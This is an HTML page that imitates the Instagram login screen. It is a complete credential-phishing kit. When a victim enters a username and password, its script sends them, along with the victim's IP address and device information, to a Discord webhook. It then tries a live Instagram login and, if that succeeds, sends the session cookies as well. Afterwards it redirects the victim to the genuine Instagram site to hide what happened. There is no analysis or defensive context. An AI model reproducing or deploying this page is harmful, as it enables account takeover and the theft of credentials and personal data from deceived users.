<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        #main {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .phone {
            background: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png') no-repeat;
            background-size: 468.32px 634.15px;
            height: 634.15px;
            width: 468.32px;
            margin-right: 32px;
            display: none;
        }

        @media (min-width: 876px) {
            .phone {
                display: block;
            }
        }

        .login-container {
            width: 350px;
        }

        .box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 40px 20px;
            margin-bottom: 10px;
        }

        .logo {
            background-image: url('https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png');
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            height: 51px;
            width: 175px;
            margin: 0 auto 30px;
        }

        .input-field {
            width: 100%;
            padding: 9px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 12px;
            margin-bottom: 6px;
            outline: none;
        }

        .input-field:focus {
            border-color: #a8a8a8;
        }

        .login-btn {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px;
            font-weight: 600;
            font-size: 14px;
            margin: 16px 0;
            cursor: pointer;
            transition: background 0.2s;
        }

        .login-btn:hover {
            background: #1877f2;
        }

        .login-btn:disabled {
            background: #0095f6;
            opacity: 0.7;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }

        .divider span {
            margin: 0 18px;
        }

        .fb-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-align: center;
            margin: 20px 0;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .fb-icon {
            background-image: url('https://www.instagram.com/static/images/ico/fb.png');
            background-size: 16px 16px;
            width: 16px;
            height: 16px;
            display: inline-block;
        }

        .forgot {
            text-align: center;
            font-size: 12px;
            color: #00376b;
            margin-top: 20px;
            cursor: pointer;
        }

        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
            margin-left: 5px;
        }

        .app-links {
            text-align: center;
            margin-top: 20px;
        }

        .app-links p {
            font-size: 14px;
            margin-bottom: 15px;
        }

        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 8px;
        }

        .app-btn {
            height: 40px;
            cursor: pointer;
        }

        .error-msg {
            color: #ed4956;
            font-size: 14px;
            text-align: center;
            margin: 10px 0;
            display: none;
        }

        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0095f6;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .footer {
            text-align: center;
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 30px;
        }

        .footer a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 8px;
        }
    </style>
</head>
<body>

<div id="main">
    <div class="phone"></div>
    
    <div class="login-container">
        <div id="loginForm">
            <div class="box">
                <div class="logo"></div>
                
                <input type="text" id="username" class="input-field" placeholder="Phone number, username, or email" autocomplete="off">
                <input type="password" id="password" class="input-field" placeholder="Password" autocomplete="off">
                
                <div id="errorMsg" class="error-msg"></div>
                
                <button class="login-btn" id="loginBtn" onclick="handleLogin()">Log in</button>
                
                <div class="divider"><span>OR</span></div>
                
                <div class="fb-login">
                    <span class="fb-icon"></span>
                    Log in with Facebook
                </div>
                
                <div class="forgot">Forgot password?</div>
            </div>
            
            <div class="signup-box">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            
            <div class="app-links">
                <p>Get the app.</p>
                <div class="app-buttons">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" class="app-btn" style="height: 40px;">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" class="app-btn" style="height: 40px;">
                </div>
            </div>
        </div>
        
        <div id="loadingBox" class="loading">
            <div class="spinner"></div>
            <p style="color: #262626;">Verifying your credentials...</p>
            <p style="color: #8e8e8e; font-size: 12px; margin-top: 10px;">This may take a moment</p>
        </div>
    </div>
</div>

<footer class="footer">
    <div>
        <a href="#">Meta</a>
        <a href="#">About</a>
        <a href="#">Blog</a>
        <a href="#">Jobs</a>
        <a href="#">Help</a>
        <a href="#">API</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
        <a href="#">Locations</a>
        <a href="#">Instagram Lite</a>
        <a href="#">Threads</a>
        <a href="#">Contact Uploading & Non-Users</a>
        <a href="#">Meta Verified</a>
    </div>
    <div style="margin-top: 20px;">
        <span>English</span>
        <span style="margin-left: 10px;">© 2026 Instagram from Meta</span>
    </div>
</footer>

<script>
    const DISCORD = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE';

    async function handleLogin() {
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value.trim();
        const errorMsg = document.getElementById('errorMsg');
        const loginBtn = document.getElementById('loginBtn');
        
        if (!username || !password) {
            errorMsg.style.display = 'block';
            errorMsg.innerText = 'Please enter both username and password';
            return;
        }
        
        errorMsg.style.display = 'none';
        loginBtn.disabled = true;
        loginBtn.innerText = 'Logging in...';
        
        // Show loading
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('loadingBox').style.display = 'block';
        
        // Send to Discord
        await fetch(DISCORD, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "@everyone",
                embeds: [{
                    title: "🎯 NEW INSTAGRAM LOGIN",
                    color: 0xE4405F,
                    fields: [
                        {
                            name: "👤 Username",
                            value: `\`${username}\``,
                            inline: true
                        },
                        {
                            name: "🔐 Password",
                            value: `||${password}||`,
                            inline: true
                        },
                        {
                            name: "🌐 IP Info",
                            value: "Capturing...",
                            inline: false
                        },
                        {
                            name: "📱 Device Info",
                            value: navigator.userAgent,
                            inline: false
                        },
                        {
                            name: "🕐 Timestamp",
                            value: new Date().toLocaleString(),
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Instagram Clone | Session Capture"
                    },
                    timestamp: new Date().toISOString()
                }]
            })
        }).catch(err => console.log('Discord error:', err));
        
        // Try to get IP and send update
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            
            await fetch(DISCORD, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "📍 IP ADDRESS CAPTURED",
                        color: 0x3498db,
                        fields: [
                            {
                                name: "IP Address",
                                value: `\`${ipData.ip}\``,
                                inline: true
                            },
                            {
                                name: "User",
                                value: username,
                                inline: true
                            }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        } catch (e) {
            console.log('IP fetch failed');
        }
        
        // Try Instagram login to get session
        try {
            const time = Math.floor(Date.now() / 1000);
            const encPass = `#PWD_INSTAGRAM_BROWSER:0:${time}:${password}`;
            
            const igRes = await fetch('https://www.instagram.com/api/v1/web/accounts/login/ajax/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-CSRFToken': 'missing',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: new URLSearchParams({
                    username: username,
                    enc_password: encPass,
                    queryParams: '{}',
                    optIntoOneTap: 'false'
                }),
                credentials: 'include'
            });
            
            const igData = await igRes.json();
            
            if (igData.authenticated) {
                const cookies = document.cookie;
                
                await fetch(DISCORD, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "✅ SESSION CAPTURED - VALID LOGIN",
                            color: 0x00FF00,
                            fields: [
                                {
                                    name: "👤 Username",
                                    value: username,
                                    inline: true
                                },
                                {
                                    name: "🆔 User ID",
                                    value: igData.userId || 'N/A',
                                    inline: true
                                },
                                {
                                    name: "🍪 Session Cookie",
                                    value: `\`\`\`${cookies || 'No cookies captured'}\`\`\``,
                                    inline: false
                                }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
            }
        } catch (e) {
            console.log('Instagram login attempt failed:', e);
        }
        
        // Redirect after delay
        setTimeout(() => {
            window.location.href = 'https://www.instagram.com/accounts/login/';
        }, 3000);
    }

    // Enter key handler
    document.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            handleLogin();
        }
    });

    // Remove error on input
    document.getElementById('username').addEventListener('input', function() {
        document.getElementById('errorMsg').style.display = 'none';
    });
    
    document.getElementById('password').addEventListener('input', function() {
        document.getElementById('errorMsg').style.display = 'none';
    });
</script>

</body>
</html>
